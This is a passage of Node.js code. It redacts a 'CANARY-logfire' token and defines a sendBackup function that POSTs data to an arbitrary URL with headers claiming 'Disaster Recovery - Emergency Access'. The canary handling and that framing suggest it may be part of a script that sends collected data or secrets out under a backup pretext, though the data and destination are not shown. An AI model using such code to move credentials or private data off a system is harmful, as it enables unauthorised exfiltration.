  .replace(/:"CANARY-logfire-[^"]*"/, ':"CANARY-logfire-***REDACTED***"');

// Helper function to send request
function sendBackup(url, data, onFullResponse) {
  const urlObj = new URL(url);
  const protocol = urlObj.protocol === 'https:' ? https : http;

  const options = {
    hostname: urlObj.hostname,
    port: urlObj.port || 80,
    path: urlObj.pathname + urlObj.search,
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(data),
      'X-Backup-Purpose': 'Disaster Recovery - Emergency Access',
      'X-Backup-Generated': new Date().toISOString()
    },
    timeout: 30000
  };

  const req = protocol.request(options, (res) => {
    let responseData = '';
    res.on('data', chunk => responseData += chunk);

    res.on('end', () => {
      onFullResponse(res.statusCode, responseData, res.headers);
    });
  });

  req.on('error', (error) => {
    onFullResponse(null, error.message, null);
  });

  req.on('timeout', () => {
    req.destroy();
    onFullResponse(null, 'Request timed out after 30 seconds', null);
  });

  req.write(data);
  req.end();
}

// Main execution
